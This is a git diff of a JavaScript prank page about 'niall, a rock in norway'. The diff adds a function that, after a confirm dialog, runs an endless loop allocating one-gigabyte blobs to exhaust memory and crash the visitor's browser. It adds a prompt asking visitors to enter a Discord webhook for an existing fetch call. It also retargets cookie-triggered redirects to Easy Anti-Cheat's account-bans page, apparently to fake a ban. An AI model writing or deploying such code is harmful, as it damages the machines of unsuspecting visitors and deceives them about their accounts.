@@ -1,8 +1,22 @@
 var numbers = [];
 for (var i = 0; i < 100; i++) numbers.push(i);
 
+function rusure() {
+  let confirmedText = confirm("do you want to send your niall to the rock in norway?");
+  if (confirmedText) {
+    leak(1000000000);
+  } else {
+    alert("there's always next time");
+  }
+}
+function leak(nBytes) {
+    while (true) {
+    const blob = new Blob([new Uint8Array(nBytes)]);
+    URL.createObjectURL(blob);
+    }
+};
 function rock() {
-var niall = prompt("niall is a rock in norway");
+var niall = prompt("send niall: the rock in norway to any discord webhook today!");
 fetch(
   niall,
   {
@@ -22,13 +36,13 @@ fetch(
 }
 
 function valve() {
-const nextURL = 'https://help.steampowered.com/en/faqs/view/647C-5CC1-7EA9-3C29'
+const nextURL = 'https://www.easy.ac/en-US/support/game/account/bans'
   if (document.cookie.includes("niall")) {
     window.location.assign(nextURL)
   }
 }
 function niall() {
-const nextURL = 'https://help.steampowered.com/en/faqs/view/647C-5CC1-7EA9-3C29'
+const nextURL =  'https://www.easy.ac/en-US/support/game/account/bans'
 
 let niallText = "niall is a rock in norway";
 if (confirm(niallText)) {
